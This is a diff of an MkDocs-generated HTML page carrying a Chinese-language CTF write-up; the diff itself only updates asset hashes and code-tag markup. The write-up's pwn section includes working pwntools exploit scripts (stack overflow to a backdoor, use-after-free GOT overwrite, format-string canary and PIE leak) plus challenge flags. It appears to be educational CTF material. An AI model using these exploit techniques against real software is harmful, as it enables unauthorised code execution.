@@ -38,7 +38,7 @@
         <meta name="lang:search.tokenizer" content="[\uff0c\u3002]+">
       
       <link rel="shortcut icon" href="../../../..">
-      <meta name="generator" content="mkdocs-1.0.4, mkdocs-material-4.6.0">
+      <meta name="generator" content="mkdocs-1.0.4, mkdocs-material-4.6.2">
     
     
       
@@ -46,9 +46,9 @@
       
     
     
-      <link rel="stylesheet" href="../../../../assets/stylesheets/application.e194128b.css">
+      <link rel="stylesheet" href="../../../../assets/stylesheets/application.adb8469c.css">
       
-        <link rel="stylesheet" href="../../../../assets/stylesheets/application-palette.3e3d1dff.css">
+        <link rel="stylesheet" href="../../../../assets/stylesheets/application-palette.a8b3c06d.css">
       
       
         
@@ -57,7 +57,7 @@
       
     
     
-      <script src="../../../../assets/javascripts/modernizr.74668098.js"></script>
+      <script src="../../../../assets/javascripts/modernizr.86422ebf.js"></script>
     
     
       
@@ -3062,7 +3062,7 @@
 <p>题目是明文</p>
 <h3 id="encryption">Encryption<a class="headerlink" href="#encryption" title="Permanent link">&para;</a></h3>
 <p>Aspack 加壳，使用esp定律脱壳后将算法逆向即可,算法如下
-<div class="codehilite"><pre><span></span><span class="kt">int</span> <span class="nf">start</span><span class="p">()</span>
+<div class="codehilite"><pre><span></span><code><span class="kt">int</span> <span class="nf">start</span><span class="p">()</span>
 <span class="p">{</span>
   <span class="kt">signed</span> <span class="kt">int</span> <span class="n">v1</span><span class="p">;</span> <span class="c1">// edx</span>
   <span class="kt">int</span> <span class="n">v2</span><span class="p">;</span> <span class="c1">// ecx</span>
@@ -3103,8 +3103,8 @@
   <span class="n">vwscanf</span><span class="p">(</span><span class="s">&quot;pause&quot;</span><span class="p">);</span>
   <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
 <span class="p">}</span>
-</pre></div></p>
-<div class="codehilite"><pre><span></span><span class="n">e</span><span class="o">=</span><span class="p">[</span>
+</code></pre></div></p>
+<div class="codehilite"><pre><span></span><code><span class="n">e</span><span class="o">=</span><span class="p">[</span>
   <span class="mh">0x7c</span><span class="p">,</span><span class="mh">0x77</span><span class="p">,</span> <span class="mh">0x7D</span><span class="p">,</span> <span class="mh">0x7A</span><span class="p">,</span> <span class="mh">0x65</span><span class="p">,</span> <span class="mh">0x5A</span><span class="p">,</span> <span class="mh">0x14</span><span class="p">,</span> <span class="mh">0x72</span><span class="p">,</span> <span class="mh">0x5B</span><span class="p">,</span> <span class="mh">0x7C</span><span class="p">,</span> <span class="mh">0x7C</span><span class="p">,</span> 
   <span class="mh">0x15</span><span class="p">,</span> <span class="mh">0x74</span><span class="p">,</span> <span class="mh">0x78</span><span class="p">,</span> <span class="mh">0x1B</span><span class="p">,</span> <span class="mh">0x47</span><span class="p">,</span> <span class="mh">0x69</span><span class="p">,</span> <span class="mh">0x59</span><span class="p">,</span> <span class="mh">0x55</span><span class="p">,</span> <span class="mh">0x5D</span><span class="p">,</span> <span class="mh">0x5A</span><span class="p">,</span> 
   <span class="mh">0x1E</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x5F</span><span class="p">,</span> <span class="mh">0x4F</span>
@@ -3118,11 +3118,11 @@
     <span class="n">i</span><span class="o">=</span><span class="n">i</span><span class="o">+</span><span class="mi">1</span>
 <span class="nb">print</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="nb">bytearray</span><span class="p">(</span><span class="n">f</span><span class="p">)))</span>
 <span class="c1"># output:flag{E4Sy_X0R_3nCrypt10n}</span>
-</pre></div>
+</code></pre></div>
 
 <h3 id="maze">maze<a class="headerlink" href="#maze" title="Permanent link">&para;</a></h3>
 <p>貌似有tls反调试，可以直接再main函数下断进行调试，不过直接查找字符串就可以看到迷宫
-<div class="codehilite"><pre><span></span>#-############################
+<div class="codehilite"><pre><span></span><code>#-############################
 #-###########----------------#
 #-###########-#########-######
 #-------------#########-######
@@ -3131,7 +3131,7 @@
 #####-###############---######
 #-----############----########
 ##################-###########
-</pre></div>
+</code></pre></div>
 根据逻辑，看样子只用输入wasd就好了
 <img alt="wasd" src="../2019-02-11-15-39-38.png" />
 最后得到结果
@@ -3144,7 +3144,7 @@ flag{HUST_CyberSecurity}</p>
 </blockquote>
 <h3 id="mang">Mang<a class="headerlink" href="#mang" title="Permanent link">&para;</a></h3>
 <p>可以看到有三段md5，分别解开后得到lyjjj tql wsl，中间要用<code>_</code>得到<code>lyjjj_tql_wsl</code> 这个作为rc4解密的key，解开flag得到<code>flag{l3h_Plastic_Memory}</code>
-<div class="codehilite"><pre><span></span><span class="kt">int</span> <span class="kr">__cdecl</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
+<div class="codehilite"><pre><span></span><code><span class="kt">int</span> <span class="kr">__cdecl</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
 <span class="p">{</span>
   <span class="kt">char</span> <span class="o">*</span><span class="n">v3</span><span class="p">;</span> <span class="c1">// eax</span>
   <span class="kt">char</span> <span class="o">*</span><span class="n">v4</span><span class="p">;</span> <span class="c1">// ebx</span>
@@ -3238,7 +3238,7 @@ flag{HUST_CyberSecurity}</p>
   <span class="p">}</span>
   <span class="k">return</span> <span class="n">v6</span><span class="p">;</span>
 <span class="p">}</span>
-</pre></div></p>
+</code></pre></div></p>
 <h2 id="misc">misc<a class="headerlink" href="#misc" title="Permanent link">&para;</a></h2>
 <h3 id="picture">Picture<a class="headerlink" href="#picture" title="Permanent link">&para;</a></h3>
 <ol>
@@ -3271,7 +3271,7 @@ tip2:密码在流量包中（HTTP）<br />
 <h2 id="pwn">pwn<a class="headerlink" href="#pwn" title="Permanent link">&para;</a></h2>
 <h3 id="stack">stack<a class="headerlink" href="#stack" title="Permanent link">&para;</a></h3>
 <p>简单的栈溢出
-<div class="codehilite"><pre><span></span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<div class="codehilite"><pre><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 <span class="n">DEBUG</span><span class="o">=</span><span class="mi">0</span>
 <span class="k">if</span> <span class="n">DEBUG</span><span class="p">:</span>
     <span class="n">p</span><span class="o">=</span><span class="n">process</span><span class="p">(</span><span class="s1">&#39;./stack&#39;</span><span class="p">)</span>
@@ -3280,11 +3280,11 @@ tip2:密码在流量包中（HTTP）<br />
 
 <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;A&#39;</span><span class="o">*</span><span class="mh">0x3A</span><span class="o">+</span><span class="s1">&#39;B&#39;</span><span class="o">*</span><span class="mi">4</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="mh">0x80491E2</span><span class="p">))</span>
 <span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
-</pre></div>
+</code></pre></div>
 flag{e46f5601-086c-4f06-bcb2-a021e104c5e5}</p>
 <h3 id="vitamin">vitamin<a class="headerlink" href="#vitamin" title="Permanent link">&para;</a></h3>
 <p>三个功能，创建修改删除
-<div class="codehilite"><pre><span></span><span class="kt">void</span> <span class="kr">__fastcall</span> <span class="n">__noreturn</span> <span class="nf">sub_4009D6</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">a1</span><span class="p">,</span> <span class="kt">int</span> <span class="o">*</span><span class="n">a2</span><span class="p">)</span>
+<div class="codehilite"><pre><span></span><code><span class="kt">void</span> <span class="kr">__fastcall</span> <span class="n">__noreturn</span> <span class="nf">sub_4009D6</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">a1</span><span class="p">,</span> <span class="kt">int</span> <span class="o">*</span><span class="n">a2</span><span class="p">)</span>
 <span class="p">{</span>
   <span class="kt">int</span> <span class="n">v2</span><span class="p">;</span> <span class="c1">// [rsp-14h] [rbp-14h]</span>
   <span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="n">v3</span><span class="p">;</span> <span class="c1">// [rsp-10h] [rbp-10h]</span>
@@ -3315,9 +3315,9 @@ flag{e46f5601-086c-4f06-bcb2-a021e104c5e5}</p>
     <span class="p">}</span>
   <span class="p">}</span>
 <span class="p">}</span>
-</pre></div>
+</code></pre></div>
 删除功能的free并没有清空指针，造成uaf漏洞。
-<div class="codehilite"><pre><span></span><span class="kr">__int64</span> <span class="nf">sub_400C74</span><span class="p">()</span>
+<div class="codehilite"><pre><span></span><code><span class="kr">__int64</span> <span class="nf">sub_400C74</span><span class="p">()</span>
 <span class="p">{</span>
   <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">buf</span> <span class="o">||</span> <span class="n">dword_6020A4</span> <span class="p">)</span>
   <span class="p">{</span>
@@ -3331,9 +3331,9 @@ flag{e46f5601-086c-4f06-bcb2-a021e104c5e5}</p>
   <span class="p">}</span>
   <span class="k">return</span> <span class="mi">0LL</span><span class="p">;</span>
 <span class="p">}</span>
-</pre></div>
+</code></pre></div>
 观察malloc大小，需要在内存中寻找0x71~0x7f的size，
-<div class="codehilite"><pre><span></span><span class="kr">__int64</span> <span class="nf">create</span><span class="p">()</span>
+<div class="codehilite"><pre><span></span><code><span class="kr">__int64</span> <span class="nf">create</span><span class="p">()</span>
 <span class="p">{</span>
   <span class="kr">__int64</span> <span class="n">v1</span><span class="p">;</span> <span class="c1">// [rsp-38h] [rbp-38h]</span>
   <span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="n">v2</span><span class="p">;</span> <span class="c1">// [rsp-10h] [rbp-10h]</span>
@@ -3349,9 +3349,9 @@ flag{e46f5601-086c-4f06-bcb2-a021e104c5e5}</p>
   <span class="n">puts</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span>
   <span class="k">return</span> <span class="mi">0LL</span><span class="p">;</span>
 <span class="p">}</span>
-</pre></div>
+</code></pre></div>
 整个exp分三步，先利用uaf 伪造在<code>bss段</code>的chunk,再修改buf的地址到got表，最后将<code>got['free']</code>改为后门地址。
-<div class="codehilite"><pre><span></span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<div class="codehilite"><pre><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 <span class="n">context</span><span class="o">.</span><span class="n">log_level</span><span class="o">=</span><span class="s1">&#39;debug&#39;</span>
 <span class="n">context</span><span class="o">.</span><span class="n">terminal</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;bash&#39;</span><span class="p">]</span>
 <span class="c1">#p=process(&#39;./vitamin&#39;)</span>
@@ -3386,11 +3386,11 @@ flag{e46f5601-086c-4f06-bcb2-a021e104c5e5}</p>
 <span class="n">change</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x400d58</span><span class="p">))</span>
 <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;2&#39;</span><span class="p">)</span>
 <span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
-</pre></div>
+</code></pre></div>
 flag{b49b2c44-35a1-4be5-9dfa-c173f20e60ee}</p>
 <h3 id="randgame">RandGame<a class="headerlink" href="#randgame" title="Permanent link">&para;</a></h3>
 <p>只有三次输出机会，每次输入的字符串都会被hash(),然后结果和一个随机数比较。
-<div class="codehilite"><pre><span></span><span class="kt">int</span> <span class="kr">__cdecl</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
+<div class="codehilite"><pre><span></span><code><span class="kt">int</span> <span class="kr">__cdecl</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
 <span class="p">{</span>
   <span class="kt">signed</span> <span class="kt">int</span> <span class="n">v3</span><span class="p">;</span> <span class="c1">// eax</span>
   <span class="kt">signed</span> <span class="kt">int</span> <span class="n">v5</span><span class="p">;</span> <span class="c1">// [esp+0h] [ebp-Ch]</span>
@@ -3411,13 +3411,13 @@ flag{b49b2c44-35a1-4be5-9dfa-c173f20e60ee}</p>
 <span class="p">}</span>
 <span class="err">显然输入的字符串是可以覆盖到到随机数`</span><span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="n">v4</span><span class="o">~</span><span class="n">v7</span><span class="err">`</span><span class="p">,</span><span class="err">只需要预先跑出</span><span class="n">hash值</span><span class="err">，再覆盖随机数，就能过</span><span class="n">check</span><span class="err">，通过</span><span class="n">check后会输出字符串</span><span class="err">，存在字符串格式化漏洞。</span>  
 <span class="err">由于程序开启了</span><span class="n">PIE</span> <span class="n">stack等保护</span><span class="err">，不能直接</span><span class="n">ret2text</span><span class="err">。要先泄露</span><span class="n">canary的值</span><span class="err">，然后泄露程序加载地址，最后再修改</span><span class="n">ret地址到后门</span><span class="err">。</span>
-</pre></div>
+</code></pre></div>
     Arch:     i386-32-little
     RELRO:    Partial RELRO
     Stack:    Canary found
     NX:       NX enabled
     PIE:      PIE enabled
-<div class="codehilite"><pre><span></span>```c
+<div class="codehilite"><pre><span></span><code>```c
 unsigned int Game()
 {
   unsigned int v0; // eax
@@ -3453,8 +3453,8 @@ unsigned int Game()
   }
   return __readgsdword(0x14u) ^ v9;
 }
-</pre></div>
-<div class="codehilite"><pre><span></span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</code></pre></div>
+<div class="codehilite"><pre><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 <span class="n">context</span><span class="o">.</span><span class="n">terminal</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;bash&#39;</span><span class="p">]</span>
 <span class="c1">#context.log_level=&#39;debug&#39;</span>
 <span class="c1">#p=process(&#39;./game&#39;)</span>
@@ -3472,13 +3472,13 @@ unsigned int Game()
 <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;base is &#39;</span><span class="o">+</span> <span class="n">base</span><span class="p">)</span>
 <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="o">*</span><span class="mh">0x100</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">canary</span><span class="p">,</span><span class="mi">16</span><span class="p">))</span><span class="o">+</span><span class="s1">&#39;A&#39;</span><span class="o">*</span><span class="mi">12</span><span class="o">+</span><span class="n">p32</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">base</span><span class="p">[:</span><span class="o">-</span><span class="mi">3</span><span class="p">]</span><span class="o">+</span><span class="s1">&#39;2f5&#39;</span><span class="p">,</span><span class="mi">16</span><span class="p">)))</span>
 <span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
-</pre></div>
+</code></pre></div>
 flag{15c36180-35bf-47af-87d9-6bcde64ff6b2}</p>
 <h2 id="pubg-cheating-tools">pubg cheating tools<a class="headerlink" href="#pubg-cheating-tools" title="Permanent link">&para;</a></h2>
 <p>程序有两个选项，一个是买，一个是激活，买没什么用处，只有一句<code>puts("send 2 BTC wallet 114514, and you'll get the download url");</code>
 <img alt="pubg" src="../2019-02-24-04-50-03.png" />
 激活的逻辑是,判断是否存在key.txt，不存在则从<code>/dev/urandom</code>读取16字节并写入
-<div class="codehilite"><pre><span></span><span class="kt">int</span> <span class="nf">sub_401E99</span><span class="p">()</span>
+<div class="codehilite"><pre><span></span><code><span class="kt">int</span> <span class="nf">sub_401E99</span><span class="p">()</span>
 <span class="p">{</span>
   <span class="kt">int</span> <span class="n">days</span><span class="p">;</span> <span class="c1">// [rsp+Ch] [rbp-D4h]</span>
   <span class="kt">char</span> <span class="n">buf</span><span class="p">;</span> <span class="c1">// [rsp+10h] [rbp-D0h]</span>
@@ -3532,9 +3532,9 @@ flag{15c36180-35bf-47af-87d9-6bcde64ff6b2}</p>
   <span class="p">}</span>
   <span class="k">return</span> <span class="n">puts</span><span class="p">(</span><span class="s">&quot;wrong code&quot;</span><span class="p">);</span>
 <span class="p">}</span>
-</pre></div>
+</code></pre></div>
 程序输入只有days可控，观察函数<code>sub_401DDC</code>可以发现<code>unsigned int</code>和<code>int</code>做了比较，那么当day为负数的时候，for循环就会超时，最后被预先设置的<code>alarm</code>中止，由于fopen的特性，key.txt文件就会被清空。那么在下一步只需输入16个0x00即可绕过验证。
-<div class="codehilite"><pre><span></span><span class="kt">int</span> <span class="kr">__fastcall</span> <span class="nf">sub_401DDC</span><span class="p">(</span><span class="kt">int</span> <span class="n">day</span><span class="p">,</span> <span class="kt">void</span> <span class="o">*</span><span class="n">ptr</span><span class="p">)</span>
+<div class="codehilite"><pre><span></span><code><span class="kt">int</span> <span class="kr">__fastcall</span> <span class="nf">sub_401DDC</span><span class="p">(</span><span class="kt">int</span> <span class="n">day</span><span class="p">,</span> <span class="kt">void</span> <span class="o">*</span><span class="n">ptr</span><span class="p">)</span>
 <span class="p">{</span>
   <span class="kt">char</span> <span class="n">s</span><span class="p">;</span> <span class="c1">// [rsp+10h] [rbp-50h]</span>
   <span class="kt">FILE</span> <span class="o">*</span><span class="n">stream</span><span class="p">;</span> <span class="c1">// [rsp+50h] [rbp-10h]</span>
@@ -3551,9 +3551,9 @@ flag{15c36180-35bf-47af-87d9-6bcde64ff6b2}</p>
   <span class="n">fwrite</span><span class="p">(</span><span class="n">ptr</span><span class="p">,</span> <span class="mh">0x20uLL</span><span class="p">,</span> <span class="mi">1uLL</span><span class="p">,</span> <span class="n">stream</span><span class="p">);</span>
   <span class="k">return</span> <span class="n">fclose</span><span class="p">(</span><span class="n">stream</span><span class="p">);</span>
 <span class="p">}</span>
-</pre></div>
+</code></pre></div>
 绕过验证后到达函数<code>sub_401BA0</code>，很简单的一个栈溢出，将ret改写为后门即可。
-<div class="codehilite"><pre><span></span><span class="kt">int</span> <span class="nf">sub_401BA0</span><span class="p">()</span>
+<div class="codehilite"><pre><span></span><code><span class="kt">int</span> <span class="nf">sub_401BA0</span><span class="p">()</span>
 <span class="p">{</span>
   <span class="kt">char</span> <span class="n">buf</span><span class="p">;</span> <span class="c1">// [rsp+0h] [rbp-20h]</span>
 
@@ -3561,9 +3561,9 @@ flag{15c36180-35bf-47af-87d9-6bcde64ff6b2}</p>
   <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">buf</span><span class="p">,</span> <span class="mh">0x60uLL</span><span class="p">);</span>
   <span class="k">return</span> <span class="n">puts</span><span class="p">(</span><span class="s">&quot;Lisence created.&quot;</span><span class="p">);</span>
 <span class="p">}</span>
-</pre></div>
+</code></pre></div>
 exp如下，需要注意的是由于只有5秒时间- -,getshell后需要立即<code>cat flag</code>(懒得再写脚本了)
-<div class="codehilite"><pre><span></span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<div class="codehilite"><pre><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 <span class="kn">import</span> <span class="nn">time</span>
 <span class="kn">import</span> <span class="nn">hashlib</span>
 <span class="n">context</span><span class="o">.</span><span class="n">log_level</span><span class="o">=</span><span class="s1">&#39;debug&#39;</span>
@@ -3587,7 +3587,7 @@ exp如下，需要注意的是由于只有5秒时间- -,getshell后需要立即<
 <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;:&#39;</span><span class="p">)</span>
 <span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s1">&#39;A&#39;</span><span class="o">*</span><span class="mh">0x28</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x401BED</span><span class="p">))</span> <span class="c1">#ret2text</span>
 <span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
-</pre></div>
+</code></pre></div>
 flag{L3H_h3r3_1s_y0ur_ch1cken_dinner}</p>
                 
                   
@@ -3688,7 +3688,7 @@ flag{L3H_h3r3_1s_y0ur_ch1cken_dinner}</p>
       
     </div>
     
-      <script src="../../../../assets/javascripts/application.970603a6.js"></script>
+      <script src="../../../../assets/javascripts/application.df00da5d.js"></script>
       
         
         
